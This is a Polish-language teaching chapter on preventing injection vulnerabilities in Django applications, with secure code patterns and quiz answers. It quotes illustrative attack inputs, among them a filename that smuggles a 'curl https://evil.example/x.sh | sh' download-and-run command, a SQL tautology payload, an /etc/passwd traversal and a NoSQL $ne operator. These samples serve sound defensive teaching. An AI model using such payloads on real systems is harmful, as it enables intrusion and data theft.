# Wstrzykiwanie

Wstrzykiwanie to rodzina podatności o wspólnym mechanizmie: dane od użytkownika trafiają do interpretera (bazy SQL, powłoki, silnika szablonów, systemu plików) jako część polecenia, a nie jako dane. Interpreter nie odróżnia wtedy, co napisał programista, a co dopisał napastnik. Django chroni przed najczęstszą odmianą, <a id="term-sql-injection"></a>[SQL injection](00%20Glossary%20Security.md#sql-injection), ale tylko dopóki programista korzysta z ORM w typowy sposób.

```text
kod programisty:  SELECT * FROM orders WHERE number = '   ' AND customer_id = 7
dane napastnika:                                        X' OR '1'='1
wynik:            SELECT * FROM orders WHERE number = 'X' OR '1'='1' AND customer_id = 7
                  interpreter widzi jedno polecenie i wykonuje logikę napastnika
```

## Dane osobno, polecenie osobno

SQL injection powstaje, gdy zapytanie SQL buduje się przez łączenie tekstu z danymi użytkownika. Skutki sięgają od odczytu całej bazy, przez modyfikację danych, po wykonanie poleceń systemowych, jeśli baza na to pozwala.

Rozwiązaniem jest <a id="term-parameterized-query"></a>[zapytanie parametryzowane](00%20Glossary%20Security.md#parameterized-query): polecenie SQL z miejscami na wartości (`%s`) jest wysyłane do bazy osobno od wartości. Sterownik bazy przekazuje wartości jako dane, więc nawet `X' OR '1'='1` jest traktowane jako zwykły tekst do porównania.

```python
# podatne: łączenie tekstu
cursor.execute(f"SELECT * FROM shop_order WHERE number = '{number}'")

# bezpieczne: parametr przekazany osobno
cursor.execute("SELECT * FROM shop_order WHERE number = %s", [number])
```

ORM Django zawsze buduje zapytania parametryzowane. Poniższe wywołania są bezpieczne niezależnie od zawartości `number`, `q` i `customer_id`:

```python
Order.objects.filter(number=number)
Product.objects.filter(name__icontains=q)
Order.objects.filter(customer_id=customer_id).exclude(status="cancelled")
```

Pod spodem Django generuje SQL z symbolami zastępczymi i przekazuje wartości osobno do sterownika (`psycopg`, `mysqlclient`). `str(queryset.query)` pokazuje zapytanie z wstawionymi wartościami, ale to tylko podgląd. Do bazy trafia wersja parametryzowana.

## Gdzie ORM przestaje chronić

ORM chroni wartości, ale nie chroni wszystkiego, co przekaże mu programista. Sytuacje, w których ochrona się kończy:

Surowy SQL z łączeniem tekstu. `raw()`, `extra()`, `RawSQL` i `cursor.execute` przyjmują parametry, ale nie wymuszają ich użycia:

```python
# podatne
Order.objects.raw(f"SELECT * FROM shop_order WHERE status = '{status}'")
Order.objects.extra(where=[f"total > {min_total}"])

# bezpieczne
Order.objects.raw("SELECT * FROM shop_order WHERE status = %s", [status])
Order.objects.annotate(net=RawSQL("total - discount", []))
```

Nazwy kolumn i kierunek sortowania. Parametry chronią wartości, ale nazwy kolumn, tabel i słowa kluczowe (`ASC`, `DESC`) nie mogą być parametrami. Jeśli pochodzą od użytkownika, trzeba je sprawdzić według listy dozwolonych wartości:

```python
SORTABLE = {"created": "created_at", "-created": "-created_at", "total": "total", "-total": "-total"}

def order_list(request):
    sort = SORTABLE.get(request.GET.get("sort"), "-created_at")
    return Order.objects.filter(customer=request.user).order_by(sort)
```

Argumenty nazwane z danych użytkownika. Rozpakowanie parametrów zapytania do `filter()` wygląda wygodnie, ale oddaje napastnikowi kontrolę nad nazwami pól i lookupami:

```python
# podatne: /api/customers/?password__startswith=pbkdf2_sha256%2410
Customer.objects.filter(**request.GET.dict())
```

Napastnik może filtrować po polach, których nie widzi w odpowiedzi, np. `password__startswith`, `is_staff`, `reset_token__startswith`. Zmieniając kolejne znaki, może odtworzyć zawartość tych pól na podstawie tego, czy odpowiedź jest pusta. To nie jest klasyczne SQL injection, bo zapytanie pozostaje parametryzowane, ale skutek jest podobny: wyciek danych. Filtry z parametrów żądania zawsze ogranicza się do jawnej listy pól, np. przez `django-filter` z `fields = ["status", "created_at"]`.

Django miało kilka podatności SQL injection właśnie w miejscach, gdzie nazwy kolumn lub aliasów pochodziły z danych: `QuerySet.order_by()` w 2021 roku, aliasy w `annotate()` i `aggregate()` przekazywane przez `**kwargs` w 2022 roku, klucze pól `JSONField` w `values()` w 2024 roku. Wszystkie zostały załatane. Wniosek dla programisty jest podwójny: aktualizuj Django (rozdział 08) i nigdy nie przekazuj danych użytkownika jako nazw pól, aliasów ani lookupów.

## Polecenia systemowe

<a id="term-command-injection"></a>[Command injection](00%20Glossary%20Security.md#command-injection) to wstrzyknięcie poleceń do powłoki systemu. Powstaje, gdy aplikacja uruchamia program przez powłokę i wstawia do polecenia dane użytkownika.

Sklep generuje miniatury obrazów przez ImageMagick:

```python
# podatne: powłoka interpretuje ; | $() `` i inne znaki specjalne
os.system(f"convert uploads/{filename} -resize 200x200 thumbs/{filename}")
# filename = "a.jpg; curl https://evil.example/x.sh | sh"

subprocess.run(f"convert uploads/{filename} -resize 200x200 thumbs/{filename}", shell=True)
```

Bezpieczne wywołanie przekazuje argumenty jako listę, bez powłoki. Program dostaje każdy element jako osobny argument, a znaki specjalne nie mają żadnego znaczenia:

```python
subprocess.run(
    ["convert", "--", src_path, "-resize", "200x200", dst_path],
    check=True, timeout=30, shell=False,
)
```

Zasady:

- zawsze lista argumentów i `shell=False`, które jest wartością domyślną,
- ścieżki budowane przez aplikację (np. z UUID), a nie z nazwy pliku od użytkownika,
- `--` przed argumentami pochodzącymi z danych, żeby nazwa pliku zaczynająca się od `-` nie została potraktowana jako opcja (argument injection),
- `timeout`, żeby złośliwy plik nie zablokował procesu,
- gdy powłoka jest naprawdę potrzebna, każdy argument przez `shlex.quote()`, ale to ostateczność,
- najlepiej w ogóle unikać zewnętrznych programów, jeśli istnieje biblioteka w Pythonie (Pillow zamiast `convert`).

## Szablony z danych użytkownika

<a id="term-ssti"></a>[Server-side template injection](00%20Glossary%20Security.md#ssti) (SSTI) powstaje, gdy dane użytkownika stają się treścią szablonu, a nie danymi wstawianymi do szablonu. Sklep pozwala sprzedawcom na marketplace zdefiniować własną treść e-maila z potwierdzeniem:

```python
# podatne: treść od sprzedawcy jest kompilowana jako szablon
from django.template import Context, Template

body = Template(seller.email_template).render(Context({"order": order}))
```

Język szablonów Django jest celowo ograniczony: nie pozwala wywoływać metod z argumentami ani importować modułów. Mimo to złośliwy szablon może odczytać wszystko, do czego prowadzą obiekty w kontekście, np. `{{ order.customer.email }}` dla każdego zamówienia albo dane innych modeli przez relacje. W Jinja2 skutki są znacznie poważniejsze. Znane techniki pozwalają przez atrybuty obiektów dojść do `os` i wykonać dowolny kod.

Podobny problem ma `str.format()` z tekstem od użytkownika. `"{order.__class__.__init__.__globals__}".format(order=order)` potrafi ujawnić zmienne globalne modułu.

Rozwiązanie: szablony tworzy programista, a użytkownik dostarcza tylko wartości. Jeśli sprzedawca musi mieć wpływ na treść, dostaje ograniczony zestaw znaczników zastępowanych jawnie:

```python
ALLOWED = {"order_number", "customer_first_name", "total"}

def render_seller_template(text: str, order: Order) -> str:
    values = {
        "order_number": order.number,
        "customer_first_name": order.customer.first_name,
        "total": f"{order.total:.2f} zł",
    }
    return re.sub(r"\{\{\s*(\w+)\s*\}\}", lambda m: escape(values.get(m.group(1), "")), text)
```

Jeśli potrzebny jest pełny silnik szablonów dla użytkowników, stosuje się jego tryb piaskownicy (`jinja2.sandbox.SandboxedEnvironment`) i przekazuje do kontekstu tylko proste wartości, a nie obiekty modeli.

## Inne interpretery

Ta sama zasada, czyli dane osobno od poleceń, dotyczy każdego interpretera.

<a id="term-path-traversal"></a>[Path traversal](00%20Glossary%20Security.md#path-traversal) to wyjście poza dozwolony katalog przez sekwencje `../` w ścieżce pliku:

```python
# podatne: /api/invoices/download/?name=../../../etc/passwd
path = os.path.join(settings.MEDIA_ROOT, "invoices", request.GET["name"])
return FileResponse(open(path, "rb"))

# bezpieczne: nazwa z bazy, a nie z żądania, i sprawdzenie, że ścieżka zostaje w katalogu
invoice = get_object_or_404(Invoice, pk=pk, order__customer=request.user)
base = (Path(settings.MEDIA_ROOT) / "invoices").resolve()
path = (base / invoice.file_name).resolve()
if not path.is_relative_to(base):
    raise Http404
return FileResponse(path.open("rb"), as_attachment=True)
```

Django ma wewnętrzną funkcję `django.utils._os.safe_join`, której używa system przechowywania plików. `FileSystemStorage` nie pozwala zapisać pliku poza `MEDIA_ROOT`. Problem pojawia się, gdy kod otwiera pliki samodzielnie, z pominięciem `Storage`.

Wstrzykiwanie nagłówków (CRLF injection) polega na dopisaniu nowych nagłówków HTTP albo e-mail przez znaki nowej linii w danych. Tu Django chroni: `HttpResponse` odrzuca nagłówki z `\r` i `\n`, a `send_mail` rzuca `BadHeaderError`, gdy temat lub adres zawiera nową linię. Ochrona przestaje działać, gdy kod buduje odpowiedź HTTP lub wiadomość e-mail ręcznie, z pominięciem tych klas.

<a id="term-nosql-injection"></a>[NoSQL injection](00%20Glossary%20Security.md#nosql-injection) dotyczy baz takich jak MongoDB. Zapytania są strukturami danych, a nie tekstem, ale jeśli strukturę buduje się bezpośrednio z JSON-a od użytkownika, napastnik może przesłać operator zamiast wartości:

```python
# podatne: body = {"email": "anna@example.com", "password": {"$ne": null}}
user = db.users.find_one({"email": body["email"], "password": body["password"]})

# bezpieczne: wymuszenie typu przed zapytaniem
if not isinstance(body.get("password"), str):
    raise ValidationError("Niepoprawne dane")
```

Walidacja typów przez serializer DRF albo model Pydantic przed zapytaniem zamyka tę klasę problemów. Podobnie w zapytaniach LDAP i XPath: znaki specjalne escapuje się funkcjami biblioteki (`ldap3.utils.conv.escape_filter_chars`), a nie ręcznie.

## Co zapamiętać

- Wstrzykiwanie powstaje, gdy dane trafiają do interpretera jako część polecenia. Rozwiązaniem jest zawsze oddzielenie danych od poleceń.
- ORM Django parametryzuje wszystkie wartości. Surowy SQL jest bezpieczny tylko z parametrami przekazanymi osobno.
- Nazwy pól, kolumn, aliasów i lookupy z danych użytkownika sprawdza się według listy dozwolonych. `filter(**request.GET.dict())` prowadzi do wycieku danych.
- Polecenia systemowe uruchamia się listą argumentów bez powłoki, z `--`, timeoutem i ścieżkami tworzonymi przez aplikację.
- Użytkownik nie tworzy szablonów, tylko dostarcza wartości do ograniczonego zestawu znaczników. W razie konieczności pomaga piaskownica.
- Ścieżki plików buduje się z danych z bazy i sprawdza przez `resolve()` i `is_relative_to()`. Django chroni nagłówki HTTP i e-mail przed CRLF, a walidacja typów chroni zapytania NoSQL.

## Pytania sprawdzające

### 6. Jak działa SQL injection i dlaczego zapytania parametryzowane go eliminują? Jak robi to ORM Django?

<details>
<summary>Odpowiedź</summary>

SQL injection powstaje, gdy zapytanie buduje się przez łączenie tekstu z danymi użytkownika, więc dane mogą zmienić logikę zapytania (np. `X' OR '1'='1`). Zapytania parametryzowane wysyłają polecenie z symbolami zastępczymi osobno od wartości, a sterownik przekazuje wartości jako dane, nigdy jako część SQL. ORM Django zawsze generuje zapytania parametryzowane i przekazuje wartości osobno do sterownika. `str(queryset.query)` to tylko podgląd.

Zobacz: sekcja „Dane osobno, polecenie osobno”.

</details>

### 7. Kiedy ORM Django przestaje chronić (`raw()`, `extra()`, `RawSQL`, f-stringi, dynamiczne `order_by` i nazwy pól) i jak pisać surowy SQL bezpiecznie?

<details>
<summary>Odpowiedź</summary>

Gdy surowy SQL (`raw()`, `extra()`, `RawSQL`, `cursor.execute`) buduje się f-stringiem zamiast przekazać parametry osobno. Gdy nazwy kolumn, kierunek sortowania, aliasy lub lookupy pochodzą od użytkownika, bo tych nie da się sparametryzować. Gdy `filter(**request.GET.dict())` pozwala filtrować po ukrytych polach, np. `password__startswith`. Bezpiecznie: wartości zawsze jako parametry (`raw(sql, [params])`), identyfikatory przez listę dozwolonych, filtry z żądania przez jawną listę pól (`django-filter`) i regularne aktualizacje Django, które miało CVE w `order_by`, aliasach i kluczach `JSONField`.

Zobacz: sekcja „Gdzie ORM przestaje chronić”.

</details>

### 8. Czym jest command injection i jak bezpiecznie wywoływać procesy z Pythona (`subprocess` z listą argumentów, `shell=False`)?

<details>
<summary>Odpowiedź</summary>

To wstrzyknięcie poleceń powłoki przez dane wstawione do polecenia uruchamianego przez `os.system` lub `subprocess` z `shell=True` (np. `; curl … | sh` w nazwie pliku). Bezpiecznie: `subprocess.run` z listą argumentów i `shell=False`, ścieżki tworzone przez aplikację, `--` przed argumentami z danych (ochrona przed argument injection), `timeout`, a gdy powłoka jest konieczna, `shlex.quote` dla każdego argumentu. Najlepiej unikać zewnętrznych programów, jeśli jest biblioteka (Pillow zamiast `convert`).

Zobacz: sekcja „Polecenia systemowe”.

</details>

### 9. Czym jest server-side template injection i dlaczego nie wolno budować szablonów Django ani Jinja2 z danych użytkownika?

<details>
<summary>Odpowiedź</summary>

SSTI powstaje, gdy dane użytkownika są kompilowane jako szablon (`Template(user_text).render(...)`). Język szablonów Django jest ograniczony, ale pozwala odczytać wszystko, do czego prowadzą obiekty w kontekście, np. przez relacje modeli. W Jinja2 znane techniki prowadzą do wykonania kodu. Podobnie działa `str.format()` z tekstem od użytkownika. Szablony tworzy programista, a użytkownik dostarcza wartości. Własne treści obsługuje się ograniczonym zestawem znaczników zastępowanych jawnie, a pełny silnik tylko w piaskownicy i z prostymi wartościami w kontekście.

Zobacz: sekcja „Szablony z danych użytkownika”.

</details>

### 10. Jak zapobiegać wstrzykiwaniu w innych miejscach: nagłówki HTTP, ścieżki plików (path traversal), zapytania do NoSQL i LDAP?

<details>
<summary>Odpowiedź</summary>

Path traversal: ścieżki buduje się z danych z bazy, a nie z żądania, i sprawdza przez `resolve()` i `is_relative_to()`. Pliki obsługuje się przez `Storage` Django, które nie wychodzi poza `MEDIA_ROOT`. Nagłówki: Django odrzuca `\r` i `\n` w `HttpResponse` i `send_mail` (`BadHeaderError`), więc nie należy budować odpowiedzi ani wiadomości ręcznie. NoSQL: wymuszenie typów (serializer, Pydantic) przed zapytaniem, żeby zamiast wartości nie przeszedł operator `{"$ne": null}`. LDAP i XPath: escapowanie funkcjami biblioteki.

Zobacz: sekcja „Inne interpretery”.

</details>
